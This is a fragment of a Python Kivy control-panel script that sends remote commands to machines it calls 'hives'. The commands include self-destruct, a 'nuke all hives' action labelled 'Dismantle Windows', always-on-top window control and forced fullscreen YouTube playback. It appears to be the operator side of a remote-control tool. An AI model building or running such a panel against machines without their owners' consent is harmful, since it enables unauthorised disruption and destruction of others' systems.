    def diversifyunprotectselffile(placeholder): 
        send(placeholder, f'unprotectselffile', mode='diversify')

    def diversifydvdtimeout(placeholder):
        send(placeholder, f'dvdtimeout{splitertextdiversified}{placeholder.root.ids.diversifydvdtimeout.text}', mode='diversify')

    def diversifyplayytvidbetweentime(placeholder):
        send(placeholder, f'playytvidbetweentime{splitertextdiversified}{placeholder.root.ids.diversifyplayytvidbetweentimeurl.text}splitterofty1243{placeholder.root.ids.diversifyplayytvidbetweentimestarttime.text}splitterofty1243{placeholder.root.ids.diversifyplayytvidbetweentimeendtime.text}', mode='diversify')

    def diversifyself_destruct(placeholder):
        global selfdestructbuttonpresses
        if selfdestructbuttonpresses > 3:
            selfdestructbuttonpresses = 0
            send(placeholder, f'self_destruct', mode='diversify')
            Clock.schedule_once(lambda dt: vary().showpopup("Self destruct sent.", True), 0) 
        else:
            # Clock.schedule_once(lambda dt: self.showpopup_message('The scan for hosts was not able to identify any hosts', "Scanner"), 0)
            # you need to press self destruct to confirm x more times
            Clock.schedule_once(lambda dt: vary().showpopup_message(f'You need to press self destruct {5-selfdestructbuttonpresses} more times to confirm', "Self destruct"))
            selfdestructbuttonpresses += 1

    def nuke_all_hives(placeholder):
        global nuketbuttonpresses
        if nuketbuttonpresses > 3:
            nuketbuttonpresses = 0
            send(placeholder, f'nuke_all_hives', mode='diversify')
            Clock.schedule_once(lambda dt: vary().showpopup("Dismantling begins.", True), 0) 
        else:
            # Clock.schedule_once(lambda dt: self.showpopup_message('The scan for hosts was not able to identify any hosts', "Scanner"), 0)
            # you need to press self destruct to confirm x more times
            Clock.schedule_once(lambda dt: vary().showpopup_message(f'You need to press {5-nuketbuttonpresses} more times to confirm', "Dismantle Windows"))
            nuketbuttonpresses += 1


    def diversifyalwaysontop(placeholder):
        send(placeholder, f'alwaysontop{splitertextdiversified}{placeholder.root.ids.diversifyalwaysontop.text}', mode='diversify')
    
    def diversifyunsetalwaysontop(placeholder):
        send(placeholder, f'unsetalwaysontop{splitertextdiversified}{placeholder.root.ids.diversifyalwaysontop.text}', mode='diversify')
        
    def diversifyplayytvidbetweentimefullscreen(placeholder):
        send(placeholder, f'playytvidbetweentimefullscreen{splitertextdiversified}{placeholder.root.ids.diversifyplayytvidbetweentimeurlfullscreen.text}splitterofty1243{placeholder.root.ids.diversifyplayytvidbetweentimestarttimefullscreen.text}splitterofty1243{placeholder.root.ids.diversifyplayytvidbetweentimeendtimefullscreen.text}', mode='diversify')
    
def main(showerror = False, whatisError = None):
    global amirunning
    
    # if __name__ == "__main__":
    if amirunning == False:
        amirunning = True
        vary().run()
    else:
        vary().stop()
        Builder.unload_file('vary.kv')
        vary().run()
amirunning = False

#Startup().run()
#exit()

while True:
   # try:
        main()
        